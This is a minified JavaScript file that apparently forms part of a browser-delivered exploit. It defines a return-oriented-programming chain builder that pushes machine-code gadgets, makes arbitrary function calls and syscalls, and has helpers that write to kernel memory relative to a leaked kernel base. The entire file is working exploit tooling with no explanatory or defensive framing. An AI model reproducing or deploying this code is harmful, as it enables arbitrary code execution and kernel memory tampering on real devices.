const stack_sz=262144,reserve_upper_stack=65536,stack_reserved_idx=reserve_upper_stack/4;window.rop=function(){return this.stackback=p.malloc32(65544),this.stack=this.stackback.add32(reserve_upper_stack),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(stack_sz),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1,this.branches_count=0;for(var a=1;a<65536-stack_reserved_idx;a++)this.stack_array[a+stack_reserved_idx]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(a,b){b instanceof int64?(this.stack_array[stack_reserved_idx+2*a]=b.low,this.stack_array[stack_reserved_idx+2*a+1]=b.hi):(this.stack_array[stack_reserved_idx+2*a]=b,this.stack_array[stack_reserved_idx+2*a+1]=0)},this.push=function(a){this.finalizeSymbolic(this.pushSymbolic(),a)},this.push_write8=function(a,b){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["pop rsi"]),this.push(b),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(a,b,c,d,e,f,g){return null!=b&&(this.push(gadgets["pop rdi"]),this.push(b)),null!=c&&(this.push(gadgets["pop rsi"]),this.push(c)),null!=d&&(this.push(gadgets["pop rdx"]),this.push(d)),null!=e&&(this.push(gadgets["pop rcx"]),this.push(e)),null!=f&&(this.push(gadgets["pop r8"]),this.push(f)),null!=g&&(this.push(gadgets["pop r9"]),this.push(g)),8&this.stack.add32(8*this.count).low&&this.push(gadgets.ret),this.push(a),this},this.call=function(a,b,c,d,e,f,g){return this.fcall(a,b,c,d,e,f,g),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(a,b,c,d,e,f,g){return this.call(window.syscalls[a],b,c,d,e,f,g)},this.get_rsp=function(){return this.stack.add32(8*this.count)},this.write_result=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(a){this.push(window.gadgets["pop rsp"]),this.push(a)},this.run=function(){p.launch_chain(this),this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(a){this.KERNEL_BASE_PTR_VAR=a},this.rax_kernel=function(a){this.push(gadgets["pop rax"]),this.push(this.KERNEL_BASE_PTR_VAR),this.push(gadgets["mov rax, [rax]"]),this.push(gadgets["pop rsi"]),this.push(a),this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(a){this.push(gadgets["pop rdi"]);var b=this.pushSymbolic();return this.rax_kernel(a),this.push(gadgets["mov [rdi], rax"]),b},this.kwrite8=function(a,b){this.rax_kernel(a),this.push(gadgets["pop rsi"]),this.push(b),this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(a,b){this.rax_kernel(a),this.push(gadgets["pop rdx"]),this.push(b),this.push(gadgets["mov [rax], edx"])},this.kwrite2=function(a,b){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(b),this.push(gadgets["mov [rax], cx"])},this.kwrite1=function(a,b){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(b),this.push(gadgets["mov [rax], cl"])},this.kwrite8_kaddr=function(a,b){this.rax_kernel(b),this.push(gadgets["mov rdx, rax"]),this.rax_kernel(a),this.push(gadgets["mov [rax], rdx"])},this};